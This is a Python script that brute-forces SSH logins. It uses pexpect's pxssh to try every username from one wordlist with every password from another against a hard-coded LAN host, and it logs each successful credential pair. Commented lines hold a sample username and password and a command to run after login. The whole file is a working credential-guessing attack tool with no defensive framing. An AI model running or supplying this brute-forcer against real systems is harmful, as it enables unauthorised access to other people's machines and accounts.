from pexpect import pxssh
import time
import os

# user = 'pi'

# password = 'toor'
cmd = 'uname -a'


def user_loop(host):
    starttime = time.strftime('%Y/%m/%d-%H:%M:%S', time.localtime())
    time_flag_st = time.time()
    log.write(starttime)
    for user in users.read().splitlines():
        print('[+]trying to ssh {} with username: {}'.format(host, user))
        pwds = open('pwd_dic.txt', 'r')
        for password in pwds.read().splitlines():
            print('[+]trying password: {} '.format(password))
            try:
                s = pxssh.pxssh()
                s.login(host, user, password)
                # s.sendline(cmd)
                # s.prompt()
                print('[+]ssh successfully with username : {} password: {}.'.format(user, password))
                log.write('[+]ssh successfully username: {} password: {}.'.format(user, password))
                currenttime = time.strftime('%Y/%m/%d-%H:%M:%S', time.localtime())
                time_flag_fi = time.time()
                log.write("finish at  {}, duration is {}  ".format(currenttime, str(time_flag_fi-time_flag_st)))
                s.logout()
            except:
                pass
                #print('[-]Connecting Error')
            pwds.close()


def main():
    global users, log
    users = open('user_dic.txt', 'r')
    log = open('ssh_bf_log.txt','a+')
    # pwds = open('pwd_dic.txt', 'r')
    host = '192.168.2.28'
    user_loop(host)
    log.close()
    users.close()


if __name__ == '__main__':
    main()
